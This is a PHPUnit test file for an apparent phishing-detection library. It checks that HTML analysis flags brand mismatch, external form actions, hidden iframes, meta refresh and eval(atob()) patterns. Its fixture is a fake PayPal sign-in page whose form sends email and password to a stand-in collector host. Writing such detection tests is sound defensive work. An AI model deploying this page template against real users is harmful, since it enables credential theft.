<?php

declare(strict_types=1);

namespace SafeSurf\Tests;

use PHPUnit\Framework\TestCase;
use SafeSurf\Checks\Content;
use SafeSurf\Config;

final class ContentAnalyzeHtmlTest extends TestCase
{
    private Config $config;

    protected function setUp(): void
    {
        $this->config = new Config();
    }

    private function phishingFixture(): string
    {
        return <<<'HTML'
        <!DOCTYPE html>
        <html>
        <head>
          <title>PayPal - Sign in to your account</title>
          <link rel="shortcut icon" href="https://www.paypal.com/favicon.ico">
          <meta http-equiv="refresh" content="3; url=https://collector.example.net/next">
          <link rel="stylesheet" href="https://cdn.assets.example.net/site.css">
        </head>
        <body>
          <p>Securely sign in to your PayPal account to continue</p>
          <form action="https://collector.example.net/submit" method="POST">
            <label for="em">Email address</label>
            <input type="email" id="em" name="email" placeholder="Email or mobile number">
            <label for="pw">Password</label>
            <input type="password" id="pw" name="password">
            <button type="submit">Log in</button>
          </form>
          <iframe src="https://tracker.example.net/pixel" width="0" height="0" style="display:none"></iframe>
          <script>eval(atob("dmFyIGEgPSAxOw=="));</script>
        </body>
        </html>
        HTML;
    }

    public function testPhishingFixtureSignals(): void
    {
        $out = Content::analyzeHtml($this->phishingFixture(), 'https://login.secure-example.com/', $this->config);
        $this->assertNotNull($out);

        $this->assertTrue($out['has_login_form']);
        $this->assertTrue($out['has_forms']);

        $form = $out['forms'][0] ?? null;
        $this->assertIsArray($form);
        $this->assertTrue($form['has_password']);
        $this->assertTrue($form['is_external']);
        $this->assertSame('https://collector.example.net/submit', $form['action']);

        $this->assertTrue($out['has_hidden_iframe']);

        $favicon = $out['favicon'];
        $this->assertTrue($favicon['is_external']);
        $this->assertSame('www.paypal.com', $favicon['external_host']);
        $this->assertSame('paypal.com', $favicon['brand_domain']);
        $this->assertTrue($favicon['brand_mismatch']);

        $pp = $out['phishing_patterns'];
        $this->assertTrue($pp['favicon_brand_mismatch']);
        $this->assertTrue($pp['meta_refresh_external']);
        $this->assertTrue($pp['login_with_brand_text']);
        $this->assertContains('PayPal', $pp['brand_names_in_text']);
        $this->assertTrue($pp['js_signals']['has_eval_atob']);
        // Stylesheet + favicon are external assets; the form action is not an asset.
        $this->assertContains('cdn.assets.example.net', $pp['external_asset_hosts']);
    }

    public function testBrandMismatchFromTitle(): void
    {
        $out = Content::analyzeHtml($this->phishingFixture(), 'https://login.secure-example.com/', $this->config);
        $this->assertTrue($out['brand_check']['is_mismatch']);
        $this->assertSame('PayPal', $out['brand_check']['brand_found']);
    }

    public function testLegitLoginPageOnOfficialDomainHasNoMismatch(): void
    {
        $html = <<<'HTML'
        <html><head><title>Log in to PayPal</title></head>
        <body><form action="/signin" method="POST">
          <input type="email" name="login_email">
          <input type="password" name="login_password">
          <button>Log in</button>
        </form></body></html>
        HTML;
        $out = Content::analyzeHtml($html, 'https://www.paypal.com/', $this->config);
        $this->assertNotNull($out);
        $this->assertTrue($out['has_login_form']);
        $this->assertFalse($out['forms'][0]['is_external']);
        $this->assertFalse($out['brand_check']['is_mismatch']);
        $this->assertFalse($out['phishing_patterns']['login_with_brand_text']);
    }

    public function testTextSampleExtractedWithoutScripts(): void
    {
        $html = '<html><body><p>Welcome to our shop</p><script>var x = "this should not appear";</script></body></html>';
        $out = Content::analyzeHtml($html, 'https://shop.example.org/', $this->config);
        $this->assertNotNull($out);
        $this->assertStringContainsString('Welcome to our shop', $out['text_sample']);
        $this->assertStringNotContainsString('should not appear', $out['text_sample']);
    }

    public function testEmptyBodyReturnsNull(): void
    {
        $this->assertNull(Content::analyzeHtml('', 'https://example.org/', $this->config));
    }
}
